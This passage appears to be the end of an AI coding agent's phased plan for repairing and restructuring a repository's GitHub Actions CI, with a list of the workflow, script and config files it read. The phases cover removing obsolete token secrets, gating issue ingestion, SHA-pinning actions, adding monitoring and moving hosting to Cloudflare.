1. **Unblock CI.** Delete `token: ${{ secrets.GH_TOKEN }}` from all 12 workflows; nothing else. Manually dispatch `Auto Update JSON Data` and confirm green + that `Generate Markdown Tables` still chains via `workflow_run`. Then `gh secret delete GH_TOKEN`.
2. **Fix the two bugs + the ingest author gate.** `bot-ingest.yml:194-202` deleted, `ingest-from-issue.yml:34-39` rewritten, `:10` gated. Then `gh secret delete BOT_TOKEN`.
3. **Normalize + restructure.** Add `.python-version`, `.github/actions/py-data-job/`, `.github/dependabot.yml`; SHA-pin everything per §3.3; move `pip install` out of `bash/*.sh` into the composite; add `timeout-minutes`; add the push-with-rebase retry.
4. **Reschedule + monitor.** New crons per §4.2; `pipeline-health.yml` + `scripts/health_report.py`; widen `notify-ci-failure.yml` / `notify-release-pipeline.yml`; commit the snapshot feature with `data-write` + gzip + retention.
5. **Cloudflare cutover.** Only after `free-steam-games.win` resolves: add `web-ci.yml`, delete `deploy-pages.yml` + `notify-deploy.yml` + `web/public/404.html`, rewrite the 18 artifacts in §6, add the D1 hook of §8.

**Files read for this analysis:** all 23 of `E:\2\.github\workflows\*.yml`, all 11 of `E:\2\bash\*.sh`, `E:\2\requirements.txt`, `E:\2\scripts\snapshot.py`, `E:\2\scripts\update_data.py`, `E:\2\scripts\core\data_store.py`, `E:\2\scripts\core\constants.py`, `E:\2\scripts\ingest_new.py`, `E:\2\web\public\{404.html,robots.txt,sitemap.xml}`, `E:\2\web\package.json`, `E:\2\web\vite.config.ts`, `E:\2\.gitignore`. Plan file written to `C:\Users\kuujo\.claude\plans\m-nh-c-n-upgrade-to-n-rosy-lighthouse-agent-a4bcdcb09ab4a7306.md`.